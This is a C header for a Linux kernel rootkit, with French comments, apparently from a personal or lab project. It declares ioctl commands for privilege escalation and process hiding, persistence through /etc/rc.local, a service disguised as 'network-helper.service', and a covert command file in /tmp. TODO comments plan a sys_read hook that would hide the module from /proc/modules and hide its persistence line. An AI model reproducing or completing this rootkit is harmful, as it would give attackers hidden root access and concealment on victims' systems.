#ifndef ROOTKIT_H
#define ROOTKIT_H

#include <linux/ioctl.h>

#ifdef __KERNEL__
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kprobes.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/ptrace.h>
#include <linux/string.h>
#include <linux/cred.h>
#endif

#define RK_MAGIC 'R'
#define MCOUNT_INSN_SIZE 5
#define NAME_MODULE "rootkit"
#define HIDDEN_SCRIPT "network-helper.service"
#define RK_MSG_MAX 256

/* chemin du fichier de persistance sur ta LFS */
#define PERSIST_FILE "/etc/rc.local"

/* chemin du fichier trigger pour le canal de comm secondaire */
#define RK_CMD_FILE "/tmp/.rk_cmd"

/* Buffer pour le canal de communication secondaire */

extern char rk_msg[RK_MSG_MAX];

/* Structure d'arguments passee a chaque commande */
struct rk_args {
    unsigned long target;
    unsigned int value;    /* parametre supplementaire selon la commande */
};

/* Definition des commandes ioctl */
#define RK_CMD_HELLO    _IO  (RK_MAGIC, 0)
#define RK_CMD_PRIVESC  _IOW (RK_MAGIC, 1, struct rk_args)
#define RK_CMD_HIDE_PID _IOW (RK_MAGIC, 2, struct rk_args)
#define RK_CMD_GETUID   _IOR (RK_MAGIC, 3, struct rk_args)

/* utilisee dans rk_ioctl() pour recevoir un message du programme compagnon */
#define RK_CMD_SET_MSG  _IOW (RK_MAGIC, 4, struct rk_args)

#ifdef __KERNEL__
#include <linux/file.h>

/* Type de la fonction originale sys_read */
typedef asmlinkage long (*orig_read_t)(const struct pt_regs *);

typedef unsigned long (*kallsyms_lookup_name_t)(const char *);

/* TODO: implementer dans rootkit.c
 * filtre la sortie de sys_read pour cacher :
 *   - la ligne "rootkit" dans /proc/modules
 *   - la ligne "insmod" dans PERSIST_FILE
 *   - injecte rk_msg si le fichier lu est RK_CMD_FILE
 */
//asmlinkage long new_read(const struct pt_regs *regs);

/* TODO: implementer dans rootkit.c
 * enregistre new_read comme hook ftrace sur __x64_sys_read
 * meme structure que install_hook() existant pour getdents64
 * retourne 0 si ok, code erreur negatif sinon
 */
int install_read_hook(kallsyms_lookup_name_t lookup);

/* TODO: implementer dans rootkit.c
 * desenregistre le hook read proprement
 * appeler depuis rootkit_exit()
 */
void uninstall_read_hook(void);

#endif /* __KERNEL__ */

#endif /* ROOTKIT_H */